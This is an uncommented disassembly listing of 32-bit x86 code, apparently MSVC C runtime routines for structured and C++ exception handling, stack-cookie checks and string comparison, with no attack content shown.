  401df4:	8b 78 0c             	mov    0xc(%eax),%edi
  401df7:	8b d7                	mov    %edi,%edx
  401df9:	89 55 fc             	mov    %edx,-0x4(%ebp)
  401dfc:	8b f2                	mov    %edx,%esi
  401dfe:	85 c9                	test   %ecx,%ecx
  401e00:	78 2d                	js     0x401e2f
  401e02:	6b c2 14             	imul   $0x14,%edx,%eax
  401e05:	83 c3 08             	add    $0x8,%ebx
  401e08:	03 c3                	add    %ebx,%eax
  401e0a:	8b 5d 10             	mov    0x10(%ebp),%ebx
  401e0d:	83 fa ff             	cmp    $0xffffffff,%edx
  401e10:	74 3c                	je     0x401e4e
  401e12:	83 e8 14             	sub    $0x14,%eax
  401e15:	4a                   	dec    %edx
  401e16:	39 58 fc             	cmp    %ebx,-0x4(%eax)
  401e19:	7d 04                	jge    0x401e1f
  401e1b:	3b 18                	cmp    (%eax),%ebx
  401e1d:	7e 05                	jle    0x401e24
  401e1f:	83 fa ff             	cmp    $0xffffffff,%edx
  401e22:	75 07                	jne    0x401e2b
  401e24:	8b 75 fc             	mov    -0x4(%ebp),%esi
  401e27:	49                   	dec    %ecx
  401e28:	89 55 fc             	mov    %edx,-0x4(%ebp)
  401e2b:	85 c9                	test   %ecx,%ecx
  401e2d:	79 de                	jns    0x401e0d
  401e2f:	42                   	inc    %edx
  401e30:	3b f7                	cmp    %edi,%esi
  401e32:	77 1a                	ja     0x401e4e
  401e34:	3b d6                	cmp    %esi,%edx
  401e36:	77 16                	ja     0x401e4e
  401e38:	8b 45 08             	mov    0x8(%ebp),%eax
  401e3b:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  401e3e:	5f                   	pop    %edi
  401e3f:	89 70 0c             	mov    %esi,0xc(%eax)
  401e42:	5e                   	pop    %esi
  401e43:	89 08                	mov    %ecx,(%eax)
  401e45:	89 50 04             	mov    %edx,0x4(%eax)
  401e48:	89 48 08             	mov    %ecx,0x8(%eax)
  401e4b:	5b                   	pop    %ebx
  401e4c:	c9                   	leave
  401e4d:	c3                   	ret
  401e4e:	e8 72 34 00 00       	call   0x4052c5
  401e53:	cc                   	int3
  401e54:	55                   	push   %ebp
  401e55:	8b ec                	mov    %esp,%ebp
  401e57:	83 ec 18             	sub    $0x18,%esp
  401e5a:	83 65 e8 00          	andl   $0x0,-0x18(%ebp)
  401e5e:	8d 45 e8             	lea    -0x18(%ebp),%eax
  401e61:	33 05 00 40 41 00    	xor    0x414000,%eax
  401e67:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401e6a:	89 45 f0             	mov    %eax,-0x10(%ebp)
  401e6d:	8b 45 0c             	mov    0xc(%ebp),%eax
  401e70:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401e73:	8b 45 14             	mov    0x14(%ebp),%eax
  401e76:	40                   	inc    %eax
  401e77:	c7 45 ec 2d 20 40 00 	movl   $0x40202d,-0x14(%ebp)
  401e7e:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  401e81:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401e84:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401e8a:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401e8d:	8d 45 e8             	lea    -0x18(%ebp),%eax
  401e90:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  401e96:	ff 75 18             	push   0x18(%ebp)
  401e99:	51                   	push   %ecx
  401e9a:	ff 75 10             	push   0x10(%ebp)
  401e9d:	e8 de 16 00 00       	call   0x403580
  401ea2:	8b c8                	mov    %eax,%ecx
  401ea4:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401ea7:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  401ead:	8b c1                	mov    %ecx,%eax
  401eaf:	c9                   	leave
  401eb0:	c3                   	ret
  401eb1:	55                   	push   %ebp
  401eb2:	8b ec                	mov    %esp,%ebp
  401eb4:	83 ec 40             	sub    $0x40,%esp
  401eb7:	53                   	push   %ebx
  401eb8:	81 7d 08 23 01 00 00 	cmpl   $0x123,0x8(%ebp)
  401ebf:	75 12                	jne    0x401ed3
  401ec1:	b8 7b 1f 40 00       	mov    $0x401f7b,%eax
  401ec6:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  401ec9:	89 01                	mov    %eax,(%ecx)
  401ecb:	33 c0                	xor    %eax,%eax
  401ecd:	40                   	inc    %eax
  401ece:	e9 d1 00 00 00       	jmp    0x401fa4
  401ed3:	83 65 c0 00          	andl   $0x0,-0x40(%ebp)
  401ed7:	c7 45 c4 ca 20 40 00 	movl   $0x4020ca,-0x3c(%ebp)
  401ede:	a1 00 40 41 00       	mov    0x414000,%eax
  401ee3:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  401ee6:	33 c1                	xor    %ecx,%eax
  401ee8:	89 45 c8             	mov    %eax,-0x38(%ebp)
  401eeb:	8b 45 18             	mov    0x18(%ebp),%eax
  401eee:	89 45 cc             	mov    %eax,-0x34(%ebp)
  401ef1:	8b 45 0c             	mov    0xc(%ebp),%eax
  401ef4:	89 45 d0             	mov    %eax,-0x30(%ebp)
  401ef7:	8b 45 1c             	mov    0x1c(%ebp),%eax
  401efa:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  401efd:	8b 45 20             	mov    0x20(%ebp),%eax
  401f00:	89 45 d8             	mov    %eax,-0x28(%ebp)
  401f03:	83 65 dc 00          	andl   $0x0,-0x24(%ebp)
  401f07:	83 65 e0 00          	andl   $0x0,-0x20(%ebp)
  401f0b:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
  401f0f:	89 65 dc             	mov    %esp,-0x24(%ebp)
  401f12:	89 6d e0             	mov    %ebp,-0x20(%ebp)
  401f15:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401f1b:	89 45 c0             	mov    %eax,-0x40(%ebp)
  401f1e:	8d 45 c0             	lea    -0x40(%ebp),%eax
  401f21:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  401f27:	8b 45 08             	mov    0x8(%ebp),%eax
  401f2a:	ff 30                	push   (%eax)
  401f2c:	e8 af a1 00 00       	call   0x40c0e0
  401f31:	59                   	pop    %ecx
  401f32:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401f35:	89 01                	mov    %eax,(%ecx)
  401f37:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  401f3e:	8b 45 08             	mov    0x8(%ebp),%eax
  401f41:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401f44:	8b 45 10             	mov    0x10(%ebp),%eax
  401f47:	89 45 ec             	mov    %eax,-0x14(%ebp)
  401f4a:	e8 97 07 00 00       	call   0x4026e6
  401f4f:	8b 40 08             	mov    0x8(%eax),%eax
  401f52:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401f55:	a1 3c d1 40 00       	mov    0x40d13c,%eax
  401f5a:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401f5d:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401f60:	ff 55 f4             	call   *-0xc(%ebp)
  401f63:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401f66:	89 45 f0             	mov    %eax,-0x10(%ebp)
  401f69:	8d 45 e8             	lea    -0x18(%ebp),%eax
  401f6c:	50                   	push   %eax
  401f6d:	8b 45 08             	mov    0x8(%ebp),%eax
  401f70:	ff 30                	push   (%eax)
  401f72:	ff 55 f0             	call   *-0x10(%ebp)
  401f75:	59                   	pop    %ecx
  401f76:	59                   	pop    %ecx
  401f77:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  401f7b:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  401f7f:	74 17                	je     0x401f98
  401f81:	64 8b 1d 00 00 00 00 	mov    %fs:0x0,%ebx
  401f88:	8b 03                	mov    (%ebx),%eax
  401f8a:	8b 5d c0             	mov    -0x40(%ebp),%ebx
  401f8d:	89 03                	mov    %eax,(%ebx)
  401f8f:	64 89 1d 00 00 00 00 	mov    %ebx,%fs:0x0
  401f96:	eb 09                	jmp    0x401fa1
  401f98:	8b 45 c0             	mov    -0x40(%ebp),%eax
  401f9b:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  401fa1:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401fa4:	5b                   	pop    %ebx
  401fa5:	c9                   	leave
  401fa6:	c3                   	ret
  401fa7:	55                   	push   %ebp
  401fa8:	8b ec                	mov    %esp,%ebp
  401faa:	51                   	push   %ecx
  401fab:	53                   	push   %ebx
  401fac:	8b 45 0c             	mov    0xc(%ebp),%eax
  401faf:	83 c0 0c             	add    $0xc,%eax
  401fb2:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401fb5:	64 8b 1d 00 00 00 00 	mov    %fs:0x0,%ebx
  401fbc:	8b 03                	mov    (%ebx),%eax
  401fbe:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  401fc4:	8b 45 08             	mov    0x8(%ebp),%eax
  401fc7:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  401fca:	8b 6d fc             	mov    -0x4(%ebp),%ebp
  401fcd:	8b 63 fc             	mov    -0x4(%ebx),%esp
  401fd0:	ff e0                	jmp    *%eax
  401fd2:	5b                   	pop    %ebx
  401fd3:	c9                   	leave
  401fd4:	c2 08 00             	ret    $0x8
  401fd7:	cc                   	int3
  401fd8:	cc                   	int3
  401fd9:	cc                   	int3
  401fda:	55                   	push   %ebp
  401fdb:	8b ec                	mov    %esp,%ebp
  401fdd:	51                   	push   %ecx
  401fde:	51                   	push   %ecx
  401fdf:	53                   	push   %ebx
  401fe0:	56                   	push   %esi
  401fe1:	57                   	push   %edi
  401fe2:	64 8b 35 00 00 00 00 	mov    %fs:0x0,%esi
  401fe9:	89 75 f8             	mov    %esi,-0x8(%ebp)
  401fec:	c7 45 fc 04 20 40 00 	movl   $0x402004,-0x4(%ebp)
  401ff3:	6a 00                	push   $0x0
  401ff5:	ff 75 0c             	push   0xc(%ebp)
  401ff8:	ff 75 fc             	push   -0x4(%ebp)
  401ffb:	ff 75 08             	push   0x8(%ebp)
  401ffe:	ff 15 70 d0 40 00    	call   *0x40d070
  402004:	8b 45 0c             	mov    0xc(%ebp),%eax
  402007:	8b 40 04             	mov    0x4(%eax),%eax
  40200a:	83 e0 fd             	and    $0xfffffffd,%eax
  40200d:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  402010:	89 41 04             	mov    %eax,0x4(%ecx)
  402013:	64 8b 3d 00 00 00 00 	mov    %fs:0x0,%edi
  40201a:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  40201d:	89 3b                	mov    %edi,(%ebx)
  40201f:	64 89 1d 00 00 00 00 	mov    %ebx,%fs:0x0
  402026:	5f                   	pop    %edi
  402027:	5e                   	pop    %esi
  402028:	5b                   	pop    %ebx
  402029:	c9                   	leave
  40202a:	c2 08 00             	ret    $0x8
  40202d:	55                   	push   %ebp
  40202e:	8b ec                	mov    %esp,%ebp
  402030:	56                   	push   %esi
  402031:	fc                   	cld
  402032:	8b 75 0c             	mov    0xc(%ebp),%esi
  402035:	8b 4e 08             	mov    0x8(%esi),%ecx
  402038:	33 ce                	xor    %esi,%ecx
  40203a:	e8 1f f2 ff ff       	call   0x40125e
  40203f:	6a 00                	push   $0x0
  402041:	56                   	push   %esi
  402042:	ff 76 14             	push   0x14(%esi)
  402045:	ff 76 0c             	push   0xc(%esi)
  402048:	6a 00                	push   $0x0
  40204a:	ff 75 10             	push   0x10(%ebp)
  40204d:	ff 76 10             	push   0x10(%esi)
  402050:	ff 75 08             	push   0x8(%ebp)
  402053:	e8 3c 0f 00 00       	call   0x402f94
  402058:	83 c4 20             	add    $0x20,%esp
  40205b:	5e                   	pop    %esi
  40205c:	5d                   	pop    %ebp
  40205d:	c3                   	ret
  40205e:	55                   	push   %ebp
  40205f:	8b ec                	mov    %esp,%ebp
  402061:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  402064:	56                   	push   %esi
  402065:	8b 75 08             	mov    0x8(%ebp),%esi
  402068:	89 0e                	mov    %ecx,(%esi)
  40206a:	e8 77 06 00 00       	call   0x4026e6
  40206f:	8b 48 24             	mov    0x24(%eax),%ecx
  402072:	89 4e 04             	mov    %ecx,0x4(%esi)
  402075:	e8 6c 06 00 00       	call   0x4026e6
  40207a:	89 70 24             	mov    %esi,0x24(%eax)
  40207d:	8b c6                	mov    %esi,%eax
  40207f:	5e                   	pop    %esi
  402080:	5d                   	pop    %ebp
  402081:	c3                   	ret
  402082:	55                   	push   %ebp
  402083:	8b ec                	mov    %esp,%ebp
  402085:	56                   	push   %esi
  402086:	e8 5b 06 00 00       	call   0x4026e6
  40208b:	8b 75 08             	mov    0x8(%ebp),%esi
  40208e:	3b 70 24             	cmp    0x24(%eax),%esi
  402091:	75 0e                	jne    0x4020a1
  402093:	8b 76 04             	mov    0x4(%esi),%esi
  402096:	e8 4b 06 00 00       	call   0x4026e6
  40209b:	89 70 24             	mov    %esi,0x24(%eax)
  40209e:	5e                   	pop    %esi
  40209f:	5d                   	pop    %ebp
  4020a0:	c3                   	ret
  4020a1:	e8 40 06 00 00       	call   0x4026e6
  4020a6:	8b 48 24             	mov    0x24(%eax),%ecx
  4020a9:	83 c1 04             	add    $0x4,%ecx
  4020ac:	eb 07                	jmp    0x4020b5
  4020ae:	3b f0                	cmp    %eax,%esi
  4020b0:	74 0b                	je     0x4020bd
  4020b2:	8d 48 04             	lea    0x4(%eax),%ecx
  4020b5:	8b 01                	mov    (%ecx),%eax
  4020b7:	85 c0                	test   %eax,%eax
  4020b9:	74 09                	je     0x4020c4
  4020bb:	eb f1                	jmp    0x4020ae
  4020bd:	8b 46 04             	mov    0x4(%esi),%eax
  4020c0:	89 01                	mov    %eax,(%ecx)
  4020c2:	eb da                	jmp    0x40209e
  4020c4:	e8 fc 31 00 00       	call   0x4052c5
  4020c9:	cc                   	int3
  4020ca:	55                   	push   %ebp
  4020cb:	8b ec                	mov    %esp,%ebp
  4020cd:	51                   	push   %ecx
  4020ce:	53                   	push   %ebx
  4020cf:	fc                   	cld
  4020d0:	8b 45 0c             	mov    0xc(%ebp),%eax
  4020d3:	8b 48 08             	mov    0x8(%eax),%ecx
  4020d6:	33 4d 0c             	xor    0xc(%ebp),%ecx
  4020d9:	e8 80 f1 ff ff       	call   0x40125e
  4020de:	8b 45 08             	mov    0x8(%ebp),%eax
  4020e1:	8b 40 04             	mov    0x4(%eax),%eax
  4020e4:	83 e0 66             	and    $0x66,%eax
  4020e7:	74 11                	je     0x4020fa
  4020e9:	8b 45 0c             	mov    0xc(%ebp),%eax
  4020ec:	c7 40 24 01 00 00 00 	movl   $0x1,0x24(%eax)
  4020f3:	33 c0                	xor    %eax,%eax
  4020f5:	40                   	inc    %eax
  4020f6:	eb 6c                	jmp    0x402164
  4020f8:	eb 6a                	jmp    0x402164
  4020fa:	6a 01                	push   $0x1
  4020fc:	8b 45 0c             	mov    0xc(%ebp),%eax
  4020ff:	ff 70 18             	push   0x18(%eax)
  402102:	8b 45 0c             	mov    0xc(%ebp),%eax
  402105:	ff 70 14             	push   0x14(%eax)
  402108:	8b 45 0c             	mov    0xc(%ebp),%eax
  40210b:	ff 70 0c             	push   0xc(%eax)
  40210e:	6a 00                	push   $0x0
  402110:	ff 75 10             	push   0x10(%ebp)
  402113:	8b 45 0c             	mov    0xc(%ebp),%eax
  402116:	ff 70 10             	push   0x10(%eax)
  402119:	ff 75 08             	push   0x8(%ebp)
  40211c:	e8 73 0e 00 00       	call   0x402f94
  402121:	83 c4 20             	add    $0x20,%esp
  402124:	8b 45 0c             	mov    0xc(%ebp),%eax
  402127:	83 78 24 00          	cmpl   $0x0,0x24(%eax)
  40212b:	75 0b                	jne    0x402138
  40212d:	ff 75 08             	push   0x8(%ebp)
  402130:	ff 75 0c             	push   0xc(%ebp)
  402133:	e8 a2 fe ff ff       	call   0x401fda
  402138:	6a 00                	push   $0x0
  40213a:	6a 00                	push   $0x0
  40213c:	6a 00                	push   $0x0
  40213e:	6a 00                	push   $0x0
  402140:	6a 00                	push   $0x0
  402142:	8d 45 fc             	lea    -0x4(%ebp),%eax
  402145:	50                   	push   %eax
  402146:	68 23 01 00 00       	push   $0x123
  40214b:	e8 61 fd ff ff       	call   0x401eb1
  402150:	83 c4 1c             	add    $0x1c,%esp
  402153:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402156:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  402159:	8b 63 1c             	mov    0x1c(%ebx),%esp
  40215c:	8b 6b 20             	mov    0x20(%ebx),%ebp
  40215f:	ff e0                	jmp    *%eax
  402161:	33 c0                	xor    %eax,%eax
  402163:	40                   	inc    %eax
  402164:	5b                   	pop    %ebx
  402165:	c9                   	leave
  402166:	c3                   	ret
  402167:	55                   	push   %ebp
  402168:	8b ec                	mov    %esp,%ebp
  40216a:	83 ec 08             	sub    $0x8,%esp
  40216d:	53                   	push   %ebx
  40216e:	56                   	push   %esi
  40216f:	57                   	push   %edi
  402170:	fc                   	cld
  402171:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402174:	33 c0                	xor    %eax,%eax
  402176:	50                   	push   %eax
  402177:	50                   	push   %eax
  402178:	50                   	push   %eax
  402179:	ff 75 fc             	push   -0x4(%ebp)
  40217c:	ff 75 14             	push   0x14(%ebp)
  40217f:	ff 75 10             	push   0x10(%ebp)
  402182:	ff 75 0c             	push   0xc(%ebp)
  402185:	ff 75 08             	push   0x8(%ebp)
  402188:	e8 07 0e 00 00       	call   0x402f94
  40218d:	83 c4 20             	add    $0x20,%esp
  402190:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402193:	5f                   	pop    %edi
  402194:	5e                   	pop    %esi
  402195:	5b                   	pop    %ebx
  402196:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402199:	8b e5                	mov    %ebp,%esp
  40219b:	5d                   	pop    %ebp
  40219c:	c3                   	ret
  40219d:	cc                   	int3
  40219e:	cc                   	int3
  40219f:	cc                   	int3
  4021a0:	55                   	push   %ebp
  4021a1:	8b ec                	mov    %esp,%ebp
  4021a3:	56                   	push   %esi
  4021a4:	8b 75 08             	mov    0x8(%ebp),%esi
  4021a7:	57                   	push   %edi
  4021a8:	8b 7d 0c             	mov    0xc(%ebp),%edi
  4021ab:	8b 06                	mov    (%esi),%eax
  4021ad:	83 f8 fe             	cmp    $0xfffffffe,%eax
  4021b0:	74 0d                	je     0x4021bf
  4021b2:	8b 4e 04             	mov    0x4(%esi),%ecx
  4021b5:	03 cf                	add    %edi,%ecx
  4021b7:	33 0c 38             	xor    (%eax,%edi,1),%ecx
  4021ba:	e8 9f f0 ff ff       	call   0x40125e
  4021bf:	8b 46 08             	mov    0x8(%esi),%eax
  4021c2:	8b 4e 0c             	mov    0xc(%esi),%ecx
  4021c5:	03 cf                	add    %edi,%ecx
  4021c7:	33 0c 38             	xor    (%eax,%edi,1),%ecx
  4021ca:	5f                   	pop    %edi
  4021cb:	5e                   	pop    %esi
  4021cc:	5d                   	pop    %ebp
  4021cd:	e9 8c f0 ff ff       	jmp    0x40125e
  4021d2:	cc                   	int3
  4021d3:	cc                   	int3
  4021d4:	cc                   	int3
  4021d5:	cc                   	int3
  4021d6:	cc                   	int3
  4021d7:	cc                   	int3
  4021d8:	cc                   	int3
  4021d9:	cc                   	int3
  4021da:	cc                   	int3
  4021db:	cc                   	int3
  4021dc:	cc                   	int3
  4021dd:	cc                   	int3
  4021de:	cc                   	int3
  4021df:	cc                   	int3
  4021e0:	55                   	push   %ebp
  4021e1:	8b ec                	mov    %esp,%ebp
  4021e3:	83 ec 1c             	sub    $0x1c,%esp
  4021e6:	53                   	push   %ebx
  4021e7:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4021ea:	56                   	push   %esi
  4021eb:	57                   	push   %edi
  4021ec:	c6 45 ff 00          	movb   $0x0,-0x1(%ebp)
  4021f0:	ff 33                	push   (%ebx)
  4021f2:	c7 45 f4 01 00 00 00 	movl   $0x1,-0xc(%ebp)
  4021f9:	e8 e2 9e 00 00       	call   0x40c0e0
  4021fe:	89 03                	mov    %eax,(%ebx)
  402200:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  402203:	8b 43 08             	mov    0x8(%ebx),%eax
  402206:	8d 73 10             	lea    0x10(%ebx),%esi
  402209:	33 05 00 40 41 00    	xor    0x414000,%eax
  40220f:	56                   	push   %esi
  402210:	50                   	push   %eax
  402211:	89 75 f0             	mov    %esi,-0x10(%ebp)
  402214:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402217:	e8 84 ff ff ff       	call   0x4021a0
  40221c:	ff 75 10             	push   0x10(%ebp)
  40221f:	e8 a8 13 00 00       	call   0x4035cc
  402224:	8b 45 08             	mov    0x8(%ebp),%eax
  402227:	83 c4 10             	add    $0x10,%esp
  40222a:	8b 7b 0c             	mov    0xc(%ebx),%edi
  40222d:	f6 40 04 66          	testb  $0x66,0x4(%eax)
  402231:	75 5a                	jne    0x40228d
  402233:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  402236:	8b 45 10             	mov    0x10(%ebp),%eax
  402239:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40223c:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40223f:	89 43 fc             	mov    %eax,-0x4(%ebx)
  402242:	83 ff fe             	cmp    $0xfffffffe,%edi
  402245:	74 69                	je     0x4022b0
  402247:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40224a:	8d 47 02             	lea    0x2(%edi),%eax
  40224d:	8d 04 47             	lea    (%edi,%eax,2),%eax
  402250:	8b 1c 81             	mov    (%ecx,%eax,4),%ebx
  402253:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  402256:	8b 48 04             	mov    0x4(%eax),%ecx
  402259:	89 45 ec             	mov    %eax,-0x14(%ebp)
  40225c:	85 c9                	test   %ecx,%ecx
  40225e:	74 14                	je     0x402274
  402260:	8b d6                	mov    %esi,%edx
  402262:	e8 89 14 00 00       	call   0x4036f0
  402267:	b1 01                	mov    $0x1,%cl
  402269:	88 4d ff             	mov    %cl,-0x1(%ebp)
  40226c:	85 c0                	test   %eax,%eax
  40226e:	78 14                	js     0x402284
  402270:	7f 48                	jg     0x4022ba
  402272:	eb 03                	jmp    0x402277
  402274:	8a 4d ff             	mov    -0x1(%ebp),%cl
  402277:	8b fb                	mov    %ebx,%edi
  402279:	83 fb fe             	cmp    $0xfffffffe,%ebx
  40227c:	75 c9                	jne    0x402247
  40227e:	84 c9                	test   %cl,%cl
  402280:	74 2e                	je     0x4022b0
  402282:	eb 20                	jmp    0x4022a4
  402284:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  40228b:	eb 17                	jmp    0x4022a4
  40228d:	83 ff fe             	cmp    $0xfffffffe,%edi
  402290:	74 1e                	je     0x4022b0
  402292:	68 00 40 41 00       	push   $0x414000
  402297:	56                   	push   %esi
  402298:	ba fe ff ff ff       	mov    $0xfffffffe,%edx
  40229d:	8b cb                	mov    %ebx,%ecx
  40229f:	e8 ac 14 00 00       	call   0x403750
  4022a4:	56                   	push   %esi
  4022a5:	ff 75 f8             	push   -0x8(%ebp)
  4022a8:	e8 f3 fe ff ff       	call   0x4021a0
  4022ad:	83 c4 08             	add    $0x8,%esp
  4022b0:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4022b3:	5f                   	pop    %edi
  4022b4:	5e                   	pop    %esi
  4022b5:	5b                   	pop    %ebx
  4022b6:	8b e5                	mov    %ebp,%esp
  4022b8:	5d                   	pop    %ebp
  4022b9:	c3                   	ret
  4022ba:	8b 45 08             	mov    0x8(%ebp),%eax
  4022bd:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%eax)
  4022c3:	75 38                	jne    0x4022fd
  4022c5:	83 3d 98 d1 40 00 00 	cmpl   $0x0,0x40d198
  4022cc:	74 2f                	je     0x4022fd
  4022ce:	68 98 d1 40 00       	push   $0x40d198
  4022d3:	e8 e8 9b 00 00       	call   0x40bec0
  4022d8:	83 c4 04             	add    $0x4,%esp
  4022db:	85 c0                	test   %eax,%eax
  4022dd:	74 1b                	je     0x4022fa
  4022df:	8b 35 98 d1 40 00    	mov    0x40d198,%esi
  4022e5:	8b ce                	mov    %esi,%ecx
  4022e7:	6a 01                	push   $0x1
  4022e9:	ff 75 08             	push   0x8(%ebp)
  4022ec:	ff 15 3c d1 40 00    	call   *0x40d13c
  4022f2:	ff d6                	call   *%esi
  4022f4:	8b 75 f0             	mov    -0x10(%ebp),%esi
  4022f7:	83 c4 08             	add    $0x8,%esp
  4022fa:	8b 45 08             	mov    0x8(%ebp),%eax
  4022fd:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  402300:	8b d0                	mov    %eax,%edx
  402302:	e8 29 14 00 00       	call   0x403730
  402307:	8b 45 0c             	mov    0xc(%ebp),%eax
  40230a:	39 78 0c             	cmp    %edi,0xc(%eax)
  40230d:	74 12                	je     0x402321
  40230f:	68 00 40 41 00       	push   $0x414000
  402314:	56                   	push   %esi
  402315:	8b d7                	mov    %edi,%edx
  402317:	8b c8                	mov    %eax,%ecx
  402319:	e8 32 14 00 00       	call   0x403750
  40231e:	8b 45 0c             	mov    0xc(%ebp),%eax
  402321:	56                   	push   %esi
  402322:	ff 75 f8             	push   -0x8(%ebp)
  402325:	89 58 0c             	mov    %ebx,0xc(%eax)
  402328:	e8 73 fe ff ff       	call   0x4021a0
  40232d:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  402330:	83 c4 08             	add    $0x8,%esp
  402333:	8b d6                	mov    %esi,%edx
  402335:	8b 49 08             	mov    0x8(%ecx),%ecx
  402338:	e8 d3 13 00 00       	call   0x403710
  40233d:	cc                   	int3
  40233e:	e8 24 14 00 00       	call   0x403767
  402343:	84 c0                	test   %al,%al
  402345:	75 03                	jne    0x40234a
  402347:	32 c0                	xor    %al,%al
  402349:	c3                   	ret
  40234a:	e8 37 04 00 00       	call   0x402786
  40234f:	84 c0                	test   %al,%al
  402351:	75 07                	jne    0x40235a
  402353:	e8 4b 14 00 00       	call   0x4037a3
  402358:	eb ed                	jmp    0x402347
  40235a:	b0 01                	mov    $0x1,%al
  40235c:	c3                   	ret
  40235d:	55                   	push   %ebp
  40235e:	8b ec                	mov    %esp,%ebp
  402360:	80 7d 08 00          	cmpb   $0x0,0x8(%ebp)
  402364:	75 0a                	jne    0x402370
  402366:	e8 4e 04 00 00       	call   0x4027b9
  40236b:	e8 33 14 00 00       	call   0x4037a3
  402370:	b0 01                	mov    $0x1,%al
  402372:	5d                   	pop    %ebp
  402373:	c3                   	ret
  402374:	55                   	push   %ebp
  402375:	8b ec                	mov    %esp,%ebp
  402377:	8b 45 08             	mov    0x8(%ebp),%eax
  40237a:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40237d:	3b c1                	cmp    %ecx,%eax
  40237f:	75 04                	jne    0x402385
  402381:	33 c0                	xor    %eax,%eax
  402383:	5d                   	pop    %ebp
  402384:	c3                   	ret
  402385:	83 c1 05             	add    $0x5,%ecx
  402388:	83 c0 05             	add    $0x5,%eax
  40238b:	8a 10                	mov    (%eax),%dl
  40238d:	3a 11                	cmp    (%ecx),%dl
  40238f:	75 18                	jne    0x4023a9
  402391:	84 d2                	test   %dl,%dl
  402393:	74 ec                	je     0x402381
  402395:	8a 50 01             	mov    0x1(%eax),%dl
  402398:	3a 51 01             	cmp    0x1(%ecx),%dl
  40239b:	75 0c                	jne    0x4023a9
  40239d:	83 c0 02             	add    $0x2,%eax
  4023a0:	83 c1 02             	add    $0x2,%ecx
  4023a3:	84 d2                	test   %dl,%dl
  4023a5:	75 e4                	jne    0x40238b
  4023a7:	eb d8                	jmp    0x402381
  4023a9:	1b c0                	sbb    %eax,%eax
  4023ab:	83 c8 01             	or     $0x1,%eax
  4023ae:	5d                   	pop    %ebp
  4023af:	c3                   	ret
  4023b0:	6a 08                	push   $0x8
  4023b2:	68 40 25 41 00       	push   $0x412540
  4023b7:	e8 e4 f7 ff ff       	call   0x401ba0
  4023bc:	8b 45 08             	mov    0x8(%ebp),%eax
  4023bf:	85 c0                	test   %eax,%eax
  4023c1:	74 7e                	je     0x402441
  4023c3:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%eax)
  4023c9:	75 76                	jne    0x402441
  4023cb:	83 78 10 03          	cmpl   $0x3,0x10(%eax)
  4023cf:	75 70                	jne    0x402441
  4023d1:	81 78 14 20 05 93 19 	cmpl   $0x19930520,0x14(%eax)
  4023d8:	74 12                	je     0x4023ec
  4023da:	81 78 14 21 05 93 19 	cmpl   $0x19930521,0x14(%eax)
  4023e1:	74 09                	je     0x4023ec
  4023e3:	81 78 14 22 05 93 19 	cmpl   $0x19930522,0x14(%eax)
  4023ea:	75 55                	jne    0x402441
  4023ec:	8b 48 1c             	mov    0x1c(%eax),%ecx
  4023ef:	85 c9                	test   %ecx,%ecx
  4023f1:	74 4e                	je     0x402441
  4023f3:	8b 51 04             	mov    0x4(%ecx),%edx
  4023f6:	85 d2                	test   %edx,%edx
  4023f8:	74 29                	je     0x402423
  4023fa:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4023fe:	52                   	push   %edx
  4023ff:	ff 70 18             	push   0x18(%eax)
  402402:	e8 4a 00 00 00       	call   0x402451
  402407:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40240e:	eb 31                	jmp    0x402441
  402410:	ff 75 0c             	push   0xc(%ebp)
  402413:	ff 75 ec             	push   -0x14(%ebp)
  402416:	e8 43 00 00 00       	call   0x40245e
  40241b:	59                   	pop    %ecx
  40241c:	59                   	pop    %ecx
  40241d:	c3                   	ret
  40241e:	8b 65 e8             	mov    -0x18(%ebp),%esp
  402421:	eb e4                	jmp    0x402407
